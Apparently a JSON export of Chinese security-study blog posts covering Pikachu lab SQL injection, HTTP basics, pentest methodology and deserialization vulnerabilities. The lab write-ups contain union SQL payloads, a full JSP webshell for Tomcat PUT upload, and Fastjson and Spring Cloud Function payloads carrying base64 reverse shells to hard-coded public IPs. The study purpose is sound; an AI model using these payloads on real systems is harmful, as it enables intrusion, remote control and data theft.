admin\n\n\n2.字符型注入\n\n\n打开题目，让我们输入我们的姓名，那我们输下kobe试试\n\n\n\n也是输入内容，回显相对应的数据，但这里输入的是字符，而不是整形的数字，所以我们猜测这里可能存在字符型注入\n\n\n我们先输入kobe'抓个包放到重放模块测试一下\n\n\n\n可以看到页面发生了报错，我们加上注释符号试一下（这里由于是get请求，所以注释符号要用–+）\n\n\n\n成功执行，那么这里就很大概率存在字符型的注入，包含的符号就是单引号\n\n\n那么我们就用上面的注入流程，来进行演示下\n\n\n\n\n这里可以看到当列数为3的时候发生了报错，而列数为2时，页面就正常了（这里的%20是空格的url编码，浏览器进行解码之后就是空格，因为在bp里加空格之后就不是在name的值输入了）\n\n\n然后我们看下回显是在第几列\n\n\n\n可以看到都有回显，那我们继续看看他的数据库名和用户名\n\n\n\n分别是pikachu和localhost，接下来就是查询mysql自带的表来获取我们想要的表名\n\n\n由于payload的长度比较长，一个一个加%20比较费劲，所以这里将我们写的payload进行 URL 编码一下，上网随便找个编码网站就行\n\n\n这里提醒一下不要将--+进行url编码，因为在数据库中注释的格式是--后面加个空格，而%20和+都是空格在 URL 中的编码，如果直接将+也进行编码解码后是--+就注释不了了，而#会被浏览器解码识别成锚点，导致后续内容不会被发送到服务器\n\n\n\n\n可以看到pikachu这个数据库里面的表已经被爆出来了，通过对名字的观察，我们想要得到的账号密码可能就在users这张表里面，那我们查询一下这个表的列都是什么\n1kobe&#x27; union select group_concat(column_name),2 from information_schema.columns where table_schema = &#x27;pikachu&#x27;  and table_name = &#x27;users&#x27;\n\n\n\n可以看到里面的列名分别是username，password正是我们想要的内容\n1union select group_concat(level,username,password),2 from users\n\n\n\n成功拿到，最后补充说下group_concat的作用，他是将数据全部变成一句话的显示出来，不用的话只会显示一部分\n\n\n3.搜索型注入\n\n\n搜索型注入，也称为文本框注入，是一种常见的SQL注入漏洞。它发生在网站提供搜索功能时，如果程序员在编写代码时忽略了对用户输入的过滤，就可能产生这种漏洞。这类注入漏洞在国内系统中普遍存在，通常分为POST和GET两种类型。GET型注入一般用于网站搜索，而POST型注入则用于用户登录。\n\n\n判断搜索型注入的方法包括\n\n搜索关键词后跟一个单引号'，如果出错，则有很大可能性存在漏洞。\n搜索关键词后跟一个百分号%，如果出错，则可能性更大\n搜索关键词后跟% 'and 1=1 and '%'='，观察返回情况。\n搜索关键词后跟% 'and 1=2 and '%'='，观察返回情况。\n根据返回情况判断是否存在搜索型文本框注入。\n\n\n\n正常搜索时，%用于包裹用户输入，实现模糊匹配；注入时，若直接输入恶意语句而不处理%，会破坏 SQL 语法。\n\n\n我们直接先拿kobe'测试一下，看看回显\n\n\n\n可以在报错中看到%，再结合关键字就能进行查询，判断大概率是模糊匹配，要用%'进行闭合，不过直接用’好像也可以，大家主要了解下模糊匹配和搜索性注入是什么即可，后面的测试流程和上面一样，这里就不过多演示了\n\n\n4.xx型注入\n\n\n先输入kobe'和kobe&quot;分别看看返回的结果\n\n\n\n\n可以看到单引号的发生了报错，而双引号没有\n\n\n\n加上#注释发生了报错，说明除了单引号还有其他的符号包裹着，我们尝试下kobe')#\n\n\n\n剩下的步骤就和上面一致了，只是多加了个括号\n\n\n5.insert/update 注入\n\n其实就是报错注入，所谓报错注入就是，开发人员为了方便调试，会将 SQL 语句执行错误后的报错信息输出到前端页面中\n\nsql未完待续，感觉你们看不懂，我后续再写详细点\n五、RCE\n概述\n\nRCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。\n\n远程系统命令执行\n\n一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口\n比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上，一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 而，如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器\n现在很多的甲方企业都开始实施自动化运维,大量的系统操作会通过&quot;自动化运维平台&quot;进行操作。 在这种平台上往往会出现远程系统命令执行的漏洞,不信的话现在就可以找你们运维部的系统测试一下,会有意想不到的&quot;收获&quot;-_-\n\n远程代码执行\n\n同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。 不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。\n因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。\n你可以通过“RCE”对应的测试栏目，来进一步的了解该漏洞。\n\n1.exec “ping”\n\n在这之前我们先来了解下什么是命令连接符\n在操作系统中，命令连接符用于将多个命令组合在一起执行，实现流程控制或批量操作\n\nLinux\n1234分号（;）：按顺序执行多个命令，前一个命令的执行结果不影响后一个命令。逻辑与（&amp;&amp;）：仅当前一个命令执行成功（返回状态码为 0）时，才执行后一个命令。逻辑或（||）：当前一个命令执行失败（返回非 0 状态码）时，才执行后一个命令。管道符（|）：\n六、文件包含漏洞\n七、文件下载漏洞\n八、文件上传漏洞\n九、越权漏洞\n十、目录遍历漏洞\n十一、敏感信息泄露\n十二、PHP反序列化漏洞\n十三、XXE\n十四、不安全的url跳转\n十五、SSRF\n","slug":"Pikachu靶场练习","date":"2025-11-02T02:00:00.000Z","categories_index":"网安基础","tags_index":"Web基础","author_index":"归尘aliez"},{"id":"c0dee51911d3712eb1635eee342507ff","title":"系统内容","content":"网安系统内容\n一.请求头、响应头\nurl: URL (Uniform Resource Locator) 是互联网上用于标识和定位资源的字符串，由多个部分组成，每个部分都有特定的字符使用规则。\n一个完整的 URL 通常包含以下部分,示例:\n12#协议://用户名:密码@子域名.域名.顶级域名:端口号/路径/文件名?查询参数#片段标识符https://john:pass123@www.example.com:8080/path/to/file.html?name=value&amp;age=25#section1\n不能直接在url里使用的字符：\n1: / ? # [ ] @ ! $ &amp; &#x27; ( ) * + , ; =\n1.请求方式\n1.1主要请求方式\n\n\n\n请求方式\n说明\n典型场景\n\n\n\n\nget\n获取资源，url字符向请求资源发送参数，url记录在历史记录和web服务器的访问日志\n页面加载、搜索查询\n\n\npost\n提交资源(创建/修改)，url字符和消息主体中发送请求参数\n登录、表单提交、文件上传\n\n\nput\n向服务器上传资源，完整更新资源（替换全部内容）,可以通过上传脚本攻击程序\nREST API中的资源更新\n\n\npatch\n部分更新资源（仅修改指定字段）\n用户资料局部修改\n\n\nhead\n与get相似，仅获取响应头（不返回Body）\n检查资源是否存在或是否修改\n\n\n\n1.2特殊请求方式\n\n\n\n请求方式\n用途\n\n\n\n\noptions\n获取服务器支持的通信选项（CORS预检请求）\n\n\ntrace\n用于诊断，检测客户端服务器之间是否有代理服务器\n\n\n\n2.请求头\n2.1通用头部\n\n\n\n请求头\n作用说明\n\n\n\n\nAccept\n向服务器声明可接受的响应类型（如text/html, application/json）\n\n\nAccept-Encoding\n告诉服务器，客户端能接受哪些内容编码、支持的压缩算法\n\n\nHost\n目标域名（HTTP/1.1必需字段）：指定请求的url的主机名称\n\n\nUser-Agent\n客户端标识：提供客户端软件信息，通过什么工具访问\n\n\nConnection\n控制连接状态（keep-alive或close）\n\n\nAccept-Language\n浏览器语言\n\n\nReferer\n发出请求的原始URL\n\n\nOrigin\n指示提出请求的域\n\n\n\n2.2安全相关头部\n\n\n\n请求头\n作用说明\n\n\n\n\nAuthorization\n认证凭证，内置HTTP身份验证向服务器提交证书\n\n\ncookie\n会话标识：向服务器提交以前发布的cookie，记录登录信息\n\n\nUpgrade-lnsecure-Requests\n自动升级请求从http到https\n\n\nX_FORWARDED_FOR\n客户端原始IP(可伪造，需谨慎信任),是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端,HTTP请求头字段  格式：请求客户端IP，代理服务器IP\n\n\nX-CSRF-Token\n防御CSRF攻击的令牌\n\n\nContent-Security-Policy\n控制资源加载策略（防御XSS）\n\n\n\n2.3条件请求头部\n\n\n\n请求头\n作用说明\n\n\n\n\nIf-Modified-Since\n资源未修改时返回304（缓存控制）浏览器最后一次收到请求资源的时间\n\n\nIf-None-Match\n基于ETag的缓存验证实体标签，服务器可用实体标签确定浏览器是否使用资源的缓存副本\n\n\n\n3.响应状态码\n\n\n\n响应状态码\n状态说明\n\n\n\n\n100 Continue\n已收到消息头，客户端继续发主体\n\n\n200 OK\n提交成功并已响应主体请求\n\n\n201 Created\n成功提交PUT请求后响应的回复\n\n\n301 Moved Permanently\n永久重定向到另一个消息头\n\n\n302 Found\n暂时重定向到另一消息头，随后就恢复使用原来url\n\n\n304 Not Modified\n使用缓存中保存的所请求资源,确定是否有最新版本资源\n\n\n400 Bad Request\n提交无效HTTP请求，如：url中多了个空格\n\n\n401 Unautorized\n请求前要求HTTP身份验证，消息头中有允许身份类型\n\n\n403 Forbidden\n禁止任何人访问被请求的资源，权限不够\n\n\n404 Not Found\n请求资源不存在\n\n\n405 Method Not Allowed\n指定URL不支持请求使用方法\n\n\n413 Request Entity Took Large\n请求的主体过长\n\n\n414 Request URL Too Long\n请求的URL过长\n\n\n500 Internal Server Error\n执行请求错误，检查服务器响应内容，了解错误详情\n\n\n503 Service Unavailable\nweb正常运转响应，但无法响应访问的应用程序，核查是否执行某行为导致\n\n\n\n\n1xx -服务器接受浏览器消息未完成\n2xx—请求被成功提交。\n3xx—客户端被重定向到其他资源。\n4xx -客户端错误\n5xx—服务器错误\n\n4.get与post的区别：\n\n\n\n维度\nget\npost\n\n\n\n\n语义\n一般用于请求获取资源，\n一般用于提交数据到后台时使用\n\n\n回退影响\n请求刷新浏览器或回退时没有影响\n回退时会重新提交数据请求\n\n\n缓存\n可被缓存\n默认不被缓存\n\n\n历史记录\n保留在浏览器历史记录中\n不会保留在浏览器历史记录中\n\n\n编码方式\n只能进行url编码\n支持多种编码方式\n\n\n数据存放\n数据放在请求url中，涉及到==url加密\n数据放在请求主体中，不会涉及到url加密\n\n\n\n5.cookie和session的区别\n\n\n\n维度\ncookie\nsession\n\n\n\n\n数据存放位置不同\n客户端(浏览器)\n服务器(内存/数据库/文件)\n\n\n数据安全性\n较低,可直接修改Cookie值进行欺骗\n较安全,仅能修改Session ID（需破解）\n\n\n数据存储类型大小\n仅字符串（最大4KB）一个站点最多保存20个  明文保存\n任意类型（对象、数组等），加密字符串\n\n\n通信方式\n每次请求自动携带（HTTP头）\n通过Session ID关联（通常存于Cookie）\n\n\n性能使用程度不同\nsession会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的内存,考虑到减轻服务器性能方面，应当使用cookie。\n\n\n\n\n5.1 cookie端：\n1234567# 服务端设置CookieHTTP/1.1 200 OKSet-Cookie: user_id=123; Expires=Wed, 21 Oct 2025 07:28:00 GMT; Secure; HttpOnly# 客户端发送CookieGET /home HTTP/1.1Cookie: user_id=123\n5.2 cookie与session工作流程：\n123456sequenceDiagram    Client-&gt;&gt;Server: 访问/login    Server-&gt;&gt;Server: 创建Session(用户数据)    Server-&gt;&gt;Client: Set-Cookie: SESSIONID=abc123    Client-&gt;&gt;Server: Cookie: SESSIONID=abc123    Server-&gt;&gt;Server: 根据abc123查找Session\n6.token令牌\ntoken：随机字符串，进行CSRF攻击防范的\ntoken的安全问题：token重放攻击、token有效性不能太久(一般1小时左右)、关闭浏览器要让token失效\n\nToken重放攻击‌：是指攻击者拦截并重放有效的Token，以冒充合法用户进行非法操作。\n\n二、Windows与Linux\n1. HTTP与HTTPS的区别\nHTTP是超文本传输协议，信息以明文进行传输\nHTTPS是超文本安全传输协议，需要进行SSL加密传输协议，HTTPS需要获得CA的证书，通常需要付费，免费的较少\n2. GBK和UTF-8区别\nGBK是中文编码字符集\nutf-8是一种全球通用的字符集\n\n\n\n维度\nGBK\nUTF-8\n\n\n\n\n覆盖范围\n主要支持中文（简体+繁体）\n支持全球所有语言\n\n\n编码单元\n双字节（部分字符用2字节）\n1-4字节\n\n\n兼容性\n兼容GB2312，不兼容ASCII\n完全兼容ASCII\n\n\n字节序\n大端序（Big-Endian）\n无字节序问题（自同步编码）\n\n\n应用场景\n很少，如：Windows XP默认编码、POS机、工业控制系统\n很广，现在基本都是\n\n\n安全性\n不安全，如：宽字节注入（如%df'被解析为汉字）\n较安全，标准化程度高\n\n\n\n3. Windows cmd如何下载文件\n\ncertutil.exe：备份证书\npowershell：powershell curl -o “输出的文件名” “下载的url”\nbitsadmin\nvbs\nftp\n\n4. 如何判断目标主机是Windows还是Linux：\n\nWindows对大小写不敏感，Linux区分大小写。\n通过ping的TTL值进行判断，TTL值240-255是Linux系统，TTL值100-130为Windows系统\n\n5. Windows 和 Linux 的日志文件放在哪里\n\nWindows 存放在 C:\\Windows\\System32\\winevt\\Logs\nLinux 日志文件通常保存在/var/log 目录\n\n三、网络通信\n1.OSI七层协议\n\n\n\n层级\n层级的相关协议和应用\n\n\n\n\n物理层\n信号转换的问题\n\n\n数据链路层\nMac地址\n\n\n网络层\nip地址\n\n\n传输层\ntcp/udp协议\n\n\n会话层\n会话层负责在数据传输中设置和维护计算机网络中两台计算机之间的通信连接\n\n\n表达层\n表达层把数据转换为能与接收者的系统格式兼容并适合传输的格式。\n\n\n应用层\n协议\n\n\n\n2.TCP与UDP协议\nTCP和UDP都是传输层协议\n\nTCP 是一种面向有连接的传输层协议，能够对自己提供的连接实施控制。适用于要求可靠传输的应用，例如文件传输。面向字节流，传输慢 （可靠性，实时，效率低）\nUDP 是一种面向无连接的传输层协议，不会对自己提供的连接实施控制。适用于实时应用，例如：IP电话、视频会议、直播等。以报文的方式传输，效率高 （不可靠，效率低）\n\n3.TCP的三次握手过程\n4.TCP的四次挥手过程\n5.PHP协议\n\nHTTP(超文本传输协议)：用于在万维网上传输数据，主要用于网站和Web服务。\nHTTPS(安全超文本传输协议)：HTTP的加密版本，提供安全的数据传输。\nFTP(文件传输协议)：用于在计算机之间传输文件。\nSMTP(简单邮件传输协议)：用于发送电子邮件。\nIMAP(互联网邮件访问协议)：用于检索电子邮件。\n\n四、数据库\n(1)mysqldump数据库备份:\n(2)mysql数据库5.0和5.0后的区别\n(3)mysql和sqlserver 有什么相似\n(4)mysql mssql oracle的区别，怎么判断是哪种数据库\n","slug":"系统内容","date":"2025-07-22T14:00:00.000Z","categories_index":"网安基础","tags_index":"Web安全","author_index":"归尘aliez"},{"id":"8078ed964e83057be24c1271b3514329","title":"渗透测试基础","content":"渗透测试\n一、什么是渗透测试？\n渗透测试（Penetration Testing，简称“渗透测试”或“PenTest”）是一种模拟攻击的安全评估方法，旨在发现系统、网络或应用程序中的安全漏洞，并评估其可能被利用的风险。渗透测试的核心目标是帮助组织识别和修复潜在的安全问题，从而提升整体安全性。\n渗透测试通常由安全专家（白帽黑客）执行，他们会模拟真实攻击者的行为，但不会对系统造成实际损害。渗透测试的结果会形成详细的报告，帮助组织了解其安全状况并采取改进措施。\n\n二、渗透测试的步骤流程\n渗透测试通常遵循一个标准化的流程，常见的是 PTES（Penetration Testing Execution Standard） 框架，主要包括以下步骤：\n1. 前期交互（Pre-engagement Interactions）\n\n确定范围：明确测试的目标（如 Web 应用、网络设备、移动应用等）和范围（如 IP 地址、域名、特定功能）。\n制定规则：确定测试的时间、方法、工具和限制条件（如是否允许社会工程攻击、是否允许 DoS 攻击）。\n签署协议：确保双方对测试内容、责任和法律问题达成一致。\n\n2. 信息收集（Information Gathering）\n\n被动信息收集：通过公开渠道（如搜索引擎、社交媒体、WHOIS 查询）收集目标信息。\n主动信息收集：通过扫描工具（如 Nmap、Masscan）获取目标的 IP 地址、开放端口、服务版本等信息。\n枚举：收集目标系统的详细信息，如用户账户、目录结构、配置文件等。\n\n3. 威胁建模（Threat Modeling）\n\n识别资产：确定目标系统中的关键资产（如数据库、敏感文件）。\n分析威胁：评估可能的攻击路径和威胁来源（如外部攻击者、内部人员）。\n优先级排序：根据威胁的严重性和可能性，确定测试的重点。\n\n4. 漏洞分析（Vulnerability Analysis）\n\n自动化扫描：使用漏洞扫描工具（如 Nessus、OpenVAS）检测已知漏洞。\n手动分析：结合经验和工具，深入分析潜在的漏洞（如逻辑漏洞、配置错误）。\n验证漏洞：确认漏洞是否真实存在，并评估其可利用性。\n\n5. 漏洞利用（Exploitation）\n\n尝试利用漏洞：使用工具（如 Metasploit、Burp Suite）或手动方法尝试利用漏洞。\n权限提升：在成功利用漏洞后，尝试获取更高权限（如从普通用户提升到管理员）。\n横向移动：在目标网络内进一步渗透，获取更多系统的控制权。\n\n6. 后渗透测试（Post-Exploitation）\n\n维持访问：测试是否可以在目标系统中建立持久性访问（如后门、计划任务）。\n数据收集：收集目标系统中的敏感信息（如数据库、配置文件）。\n清理痕迹：清理测试过程中留下的日志和文件，避免影响目标系统。\n\n7. 报告编写（Reporting）\n\n详细记录：将测试过程、发现的问题、利用的漏洞和获取的权限详细记录下来。\n风险评估：评估漏洞的严重性和对业务的影响。\n修复建议：提供具体的修复建议和最佳实践。\n\n\n三、渗透测试报告\n渗透测试报告是渗透测试的最终成果，通常包括以下内容：\n1. 概述（Executive Summary）\n\n测试目标：说明测试的范围和目标。\n测试结果：简要描述发现的主要问题和风险。\n风险评估：从业务角度评估整体风险。\n\n2. 技术细节（Technical Details）\n\n漏洞列表：列出所有发现的漏洞，包括漏洞名称、描述、严重等级（如 CVSS 评分）。\n漏洞利用过程：详细描述漏洞的利用步骤，包括使用的工具和方法。\n截图和日志：提供漏洞利用的截图和相关日志，便于复现和验证。\n\n3. 修复建议（Remediation Recommendations）\n\n具体修复措施：针对每个漏洞提供具体的修复建议（如更新补丁、修改配置）。\n最佳实践：提供长期的安全改进建议（如加强访问控制、定期安全审计）。\n\n4. 附录（Appendix）\n\n工具列表：列出测试过程中使用的工具。\n参考资料：提供相关的技术文档、漏洞数据库链接等。\n\n\n四、渗透测试的类型\n根据测试的范围和目标，渗透测试可以分为以下几种类型：\n\n黑盒测试：测试者对目标系统一无所知，模拟外部攻击者的行为。\n白盒测试：测试者拥有目标系统的完整信息，模拟内部攻击者的行为。\n灰盒测试：测试者拥有部分信息，介于黑盒和白盒之间。\n\n\n总结\n渗透测试是网络安全的重要组成部分，通过模拟攻击帮助组织发现和修复漏洞。其标准流程包括前期交互、信息收集、威胁建模、漏洞分析、漏洞利用、后渗透测试和报告编写。渗透测试报告是测试的最终成果，应包含概述、技术细节、修复建议和附录等内容。通过定期进行渗透测试，组织可以有效提升其安全防护能力。\n","slug":"渗透测试","date":"2025-07-22T13:00:00.000Z","categories_index":"渗透基础","tags_index":"渗透","author_index":"归尘aliez"},{"id":"9481c28de8022105da3986b737672c94","title":"反序列化漏洞","content":"反序列化漏洞\n未对反序列化的输入数据做合法性校验，导致攻击者可以控制反序列化的内容。\n&lt;一&gt;序列化serialize()\n将对象（内存中的数据结构或状态）转换为可存储或传输的格式（字节流、JSON、XML等）。\n1234567891011121314151617class S&#123;    public $test=&quot;pikachu&quot;;&#125;$se=new S(); //创建一个对象serialize($se); //把这个对象进行序列化序列化后得到的结果是这个样子的:O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;    O:代表object    1:代表对象名字长度为一个字符    S:对象的名称    1:代表对象里面有一个变量    s:数据类型    4:变量名称的长度    test:变量名称    s:数据类型    7:变量值的长度    pikachu:变量值\n&lt;二&gt;反序列化unserialize()\n就是将序列化后的数据还原为原始对象。然后在接下来的代码中继续使用。\n123$u=unserialize(&quot;O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;&quot;);echo $u-&gt;test; //得到的结果为pikachu\n序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题\n123456789101112131415161718192021222324常见的几个魔法函数:__construct()当一个对象创建时被调用__destruct()当一个对象销毁时被调用__toString()当一个对象被当作一个字符串使用__sleep() 在对象在被序列化之前运行__wakeup将在序列化之后立即被调用漏洞举例:class S&#123;    var $test = &quot;pikachu&quot;;    function __destruct()&#123;        echo $this-&gt;test;    &#125;&#125;$s = $_GET[&#x27;test&#x27;];@$unser = unserialize($a);payload:O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;&#125;\n1.thinkphp反序列化\n用户参数可控，在序列化的时候加入了攻击代码，反序列化的时候没有做安全过滤等机制，导致了参数进入服务器并且魔法函数自动调用导致攻击。\n1用户参数（实体对象）----序列化（打包）----&gt;序列化字符串------反序列化（拆包）-----&gt;转为实体对象\n&lt;三&gt;php反序列化魔法函数：\n\n\n\n\n\n\n\n\n\n_construct()：创建对象时自动调用\n_destruct()：销毁对象时自动调用\n\n\n_get()：读取不可访问属性时，被调用\n_toString()：对象被当作字符串时调用\n\n\n_sleep()：对象被序列化前调用\n_wakeup()：对象被序列化后调用\n\n\n_call()：调用不可访问方法时，_call()会被调用\n\n\n\n\n一、中间件反序列化漏洞\n1.jboss反序列化\nJBoss 5.x/6.x 反序列化漏洞\n该漏洞利用了 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化 。\nHttpInvoker 是 JBoss（WildFly）提供的一个远程调用（RPC）框架，允许客户端通过 HTTP 协议 调用服务器端的 Java 方法（类似 Java RMI，但基于 HTTP）。其核心特点包括：\n\n基于序列化：通过 Java 对象序列化传输数据\n\nReadOnlyAccessFilter  是 JBoss HttpInvoker 的一个安全过滤器，主要用于：\n\n限制远程调用的权限：确保只有 只读操作（如查询）能被执行，阻止 写操作（如修改配置、执行命令）。\n防御恶意调用：防止攻击者通过 HttpInvoker 接口执行危险操作（如反序列化攻击、未授权访问）。\n\n2.WebLogic反序列化\nWebLogic 服务在反序列化数据时未进行安全校验，攻击者可构造恶意序列化数据，WebLogic 自动反序列化数据，执行恶意脚本或命令\nWeblogic 常见漏洞有那些：\n\n弱口令\n反序列化漏洞（CVE-2019-2725 ）\n任意文件上传漏洞操作（CVE-2018-2894）\nSSRF 漏洞（需要安装Weblogic时选择UDDI组件）\n\n3.tomcat反序列化\nCVE-2017-12615是Apache Tomcat中的一个高危漏洞\nTomcat运行在Windows操作系统上，并启用了**HTTP PUT请求方法时，攻击者可以通过构造PUT请求，在服务器上任意写入文件。这种漏洞允许攻击者上传JSP文件**到服务器，再使用木马连接工具操控对方服务器\n123456789101112131415161718192021222324252627282930313233PUT /xx.jsp/ HTTP/1.1HOST: *****User-Agent: ******........--------------------------------请求体xx.jsp木马内容，密码passwd-----------------------------&lt;%!    class U extends ClassLoader &#123;        U(ClassLoader c) &#123;            super(c);        &#125;        public Class g(byte[] b) &#123;            return super.defineClass(b, 0, b.length);        &#125;    &#125;     public byte[] base64Decode(String str) throws Exception &#123;        try &#123;            Class clazz = Class.forName(&quot;sun.misc.BASE64Decoder&quot;);            return (byte[]) clazz.getMethod(&quot;decodeBuffer&quot;, String.class).invoke(clazz.newInstance(), str);        &#125; catch (Exception e) &#123;            Class clazz = Class.forName(&quot;java.util.Base64&quot;);            Object decoder = clazz.getMethod(&quot;getDecoder&quot;).invoke(null);            return (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, String.class).invoke(decoder, str);        &#125;    &#125;%&gt;&lt;%    String cls = request.getParameter(&quot;passwd&quot;);    if (cls != null) &#123;        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);    &#125;%&gt;\n二、框架漏洞反序列化\n&lt;一&gt;  JNDI\nJNDI全称为Java命名和目录接口。我们可以理解为JNDI提供了两个服务，即命名服务和目录服务。\n&lt;二&gt;  RMI\nRMI（Remote Method Invocation）远程方法调用，是专为Java环境设计的远程方法调用机制，远程服务器实现具体的Java方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法。\n&lt;三&gt; lookup函数\n如果lookup参数可控的话，那么我们就可以传入恶意的url地址来控制受害者加载攻击者指定的恶意类。当我们指定一个恶意的URL地址之后，受害者在获取完这个远程对象之后，开始调用恶意方法。但是在RMI中，调用远程方法，最终的执行是服务端去执行。只是把最终的结果以序列化的形式传递给客户端，也就是这里所说的受害者。当然，如果受害者内部存在漏洞组件存在反序列化漏洞的话，我们可以构造恶意的序列化对象，返回给客户端，当客户端在进行反序列化的时候，可以触发漏洞；如果目标组件不存在反序列化漏洞，我们返回一个恶意对象，但是客户端本地没有这个class文件，当然也就不能成功获取到这个对象。\n&lt;四&gt;  LADP\nLDAP是轻型目录访问协议的缩写，是一种用于访问和维护分层目录信息的协议。\n1.shiro550反序列化\nApache Shiro 1.4.2之前版本中存在安全漏洞。当Apache Shiro使用了默认的‘记住我’配置时，攻击者可利用该漏洞对cookies实施填充攻击。\n1.原理：\nshiro默认使用了Cookie RememberMe Manager，其处理cookie（值）的流程（反序列化过程）是：\n得到rememberMe（参数）的cookie值 –-&gt; Base64解码 –-&gt; AES解密 –-&gt;反序列化\n然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。，最终实现远程代码执行（RCE）\n2.相关知识\n\nCookie 值本身是加密后的数据\nAES硬编码 指在代码或配置中直接明文写入 AES加密算法的密钥（Key）或初始化向量（IV），例如：\n\n123// 硬编码示例（不安全！）String key = &quot;0123456789ABCDEF0123456789ABCDEF&quot;; // 32字节密钥（AES-256）byte[] iv = &quot;1234567890ABCDEF&quot;.getBytes();       // 16字节IV\n这种方式将敏感信息（密钥）直接暴露在源码中，而非通过安全方式（如密钥管理系统、环境变量）动态获取。\n3.判断：\n1.数据返回包中包含 rememberMe=deleteMe 字段。\n2.直接发送原数据包，返回的数据中不存在关键字可以通过在发送数据包的 cookie 中增加字段：**rememberMe=**然后查看返回数据包中是否存在关键字。\n2.fastjson反序列化\nfastjson是阿里巴巴的开源JSON解析库，fastjson的主要功能就是将Java Bean序列化成JSON字符串，这样得到字符串之后就可以通过数据库等方式进行持久化了。\nJSON字符串中多出了一个@type字段，使用SerializerFeature.WriteClassName  标注了类对应的原始类型，方便在反序列化的时候定位到具体类型，这个就是AutoType，和引入AutoType的原因。\n1.1 原理：\nfastjson在解析json的过程中,支持使用**@type字段来指定反序列化的类型,并调用该类的set/get方法来访问属性,当组件开启了autotype功能**并且反序列化不可信数据时,攻击者可以构造数据,\n使目标应用的代码执行流程进入特定类的特定setter或者getter方法中,即可构造出一些恶意利用链。\n1.2 指纹特征：\n(1) 根据返回包判断\n任意抓个包，提交方式改为POST，花括号不闭合。返回包在就会出现fastjson字样。当然这个可以屏蔽！\n(2)利用DNSlog盲打\n构造以下payload，利用dnslog平台接收\n1&#123;&quot;zeo&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;\n(3) Java站并且传的数据是JSON格式的都可以尝试\n(4) 指纹扫描检测\n1.3 漏洞利用\nFastjson 漏洞依赖特定类的属性和方法，经典利用链包括：\n\nJdbcRowSetImpl + JNDI 注入（CVE-2017-18349、cnvd_2019_22238  ）：\n\nJdbcRowSetImpl 的 setDataSourceName() 方法触发 JNDI 查询。\n结合远程恶意类加载（如 Exploit.class 中定义静态代码块执行命令）。\n\n\n\n示例：\n在公网服务器上JNDI注入：\n12345java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo, YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjEuNDAuMTYyLjM5Lzc3NzcgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A &quot;121.40.162.39&quot;#相关说明：YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjEuNDAuMTYyLjM5Lzc3NzcgMD4mMQ==    --base64解码--&gt;bash -i &gt;&amp; /dev/tcp/121.40.162.39/7777 0&gt;&amp;1  #攻击者IP和监听端口，前后一致\n将会生成rmi：\n\n刷新页面抓包，修改请求方式为POST，设置fastjson payload：\n1234567&#123;    &quot;b&quot;:&#123;    &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,    &quot;dataSourceName&quot;:&quot;rmi://8.220.194.45:1099/7b2rz4&quot;,    &quot;autoCommit&quot;:true    &#125;&#125;\n再开一个终端，执行监听nc -nvlp 7777；并将修改之后的bp包发送，成功将触发shell反弹：\n\n\n3.springboot反序列化（绿叶）\n1.原理：\n当Spring Cloud Function 使用functionRouter路径时，HTTP请求头参数存在 SPEL表达式注入漏洞，攻击者可通过该漏洞进行远程命令执行。\n请求头修改、增加内容：\n12POST /functionRouter HTTP/1.1 #修改内容spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;bash -c &#123;echo, YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzNC42OS43MS8yMjIyIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)  #需要添加的内容\n2.漏洞利用\n靶场：春秋云镜 CVE-2022-22963\n在kali里用sbscan扫描,发现springboot漏洞：\n# python.exe sbscan.py -u  [ip]\n\n抓包修改：\n\n开启监听，然后发送请求，收到shell反弹：\n\n4.log4j与log4j2的关系\nlog4j 是 Apache 的一个开源日志库，是一个基于 Java 的日志记录框架\nLog4j2 是 log4j 的后继者，其中引入了大量丰富的特性，可以控制日志信息输送的目的地为控制台、文件、GUI 组件等，被应用于业务系统开发，用于记录程序输入输出日志信息\n5.log4j2反序列化\n1.原理：\nlog4j2 在日志输出中，未对字符合法性进行严格的限制，攻击者通过构造**$&#123;jndi:ldap:恶意url/poc&#125;恶意日志，在log4j2通过 JNDI 的lookup()**函数解析日志时，就会执行poc.class文件里的代码，实现 JNDI注入，从而造成RCE。\n\n2.漏洞利用\nLog4j2 默认支持 